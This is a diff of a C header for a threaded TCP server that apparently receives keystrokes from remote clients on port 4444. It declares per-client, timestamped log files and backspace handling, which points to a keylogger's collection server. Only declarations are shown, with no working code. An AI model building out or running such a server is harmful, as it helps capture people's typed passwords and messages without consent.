@@ -1,4 +1,3 @@
-// server.h
 #ifndef SERVER_H
 #define SERVER_H
 
@@ -6,68 +5,50 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <netdb.h>
-#include <sys/types.h>
 #include <sys/socket.h>
+#include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/stat.h>
+#include <sys/types.h>
 #include <pthread.h>
+#include <time.h>
+
+#define SERVER_PORT 4444           // Port to listen on for incoming connections
+#define BUFFER_SIZE 1024           // Buffer size for receiving network data
+#define PROGRAM_SUCCESS 0          // Standard success exit code
+#define PROGRAM_FAILURE 1          // Standard failure exit code
+#define LOG_DIR "client_logs"      // Directory to store log files
+
 
 /**
- * @def SERVER_PORT
- * @brief Port number for the server to listen on.
- */
-#define SERVER_PORT "8080" 
-
-/**
- * @def BACKLOG
- * @brief Maximum number of pending connections.
- */
-#define BACKLOG 10 
-
-/**
- * @def BUFFER_SIZE
- * @brief Size of the buffer for receiving data.
- */
-#define BUFFER_SIZE 1024 
-
-/**
- * @def LOG_DIR
- * @brief Directory to store client logs.
- */
-#define LOG_DIR "client_logs" 
-
-/**
- * @def SUCCESS
- * @brief Success status code.
- */
-#define SUCCESS 0 
-
-/**
- * @def ERR_THREAD_CREATION
- * @brief Error status code for thread creation failure.
- */
-#define ERR_THREAD_CREATION 1 
-
-/**
- * @struct ClientData
- * @brief Structure to hold data for a connected client.
- * @var ClientData::socket_fd 
- * Socket file descriptor for the client connection.
- * @var ClientData::ip_address 
- * Client's IP address.
+ * @brief Structure containing client connection information.
+ * 
+ * This structure is used to package the client's socket file descriptor 
+ * and IP address so they can be safely passed to a dedicated handler thread 
+ * upon a successful connection.
  */
 typedef struct {
     int socket_fd;
-    char ip_address[INET6_ADDRSTRLEN]; 
+    char ip_address[INET_ADDRSTRLEN];
 } ClientData;
 
 /**
- * @brief Thread worker function to handle incoming keystrokes from a single client.
- * @details Creates a unique log file based on the client's IP address. Continuously reads
- * data from the client's socket and appends it to the log file in real-time.
- * @param arg Pointer to a ClientData structure containing the socket FD and IP address.
- * @return void* Returns NULL upon thread termination.
+ * @brief Creates a new log file with a timestamped filename, including the client IP.
+ * @param client_ip The IP address of the connected client.
+ * @return FILE pointer to the created log file, or NULL on error.
+ */
+FILE* create_client_log_file(const char* client_ip);
+
+/**
+ * @brief Handles Backspace events by truncating the last written char in the log.
+ * @param log_file The file pointer to modify.
+ */
+void handle_backspace(FILE *log_file);
+
+/**
+ * @brief Thread function to handle incoming data from a specific client.
+ * @param arg Pointer to the ClientData structure.
+ * @return NULL upon thread termination.
  */
 void *handle_client(void *arg);
 
